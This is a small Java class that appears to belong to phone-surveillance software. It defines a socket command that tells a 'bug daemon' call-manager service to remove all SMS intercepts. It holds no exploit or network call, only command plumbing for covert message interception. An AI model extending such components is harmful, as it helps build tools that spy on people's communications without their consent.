package com.vvt.callmanager.ref.command;

import com.fx.socket.SocketCmd;
import com.vvt.callmanager.ref.BugDaemonResource;

public class RemoteRemoveAllSmsIntercept extends SocketCmd<String, Boolean>{

	private static final long serialVersionUID = 3085272853719750801L;
	
	private static final String TAG = "RemoteRemoveAllSmsIntercept";
	private static final String SERVER_NAME = BugDaemonResource.CallMgr.SOCKET_NAME;

	public RemoteRemoveAllSmsIntercept(String ownerPackage) {
		super(ownerPackage, Boolean.class);
	}

	@Override
	protected String getTag() {
		return TAG;
	}

	@Override
	protected String getServerName() {
		return SERVER_NAME;
	}
	
}
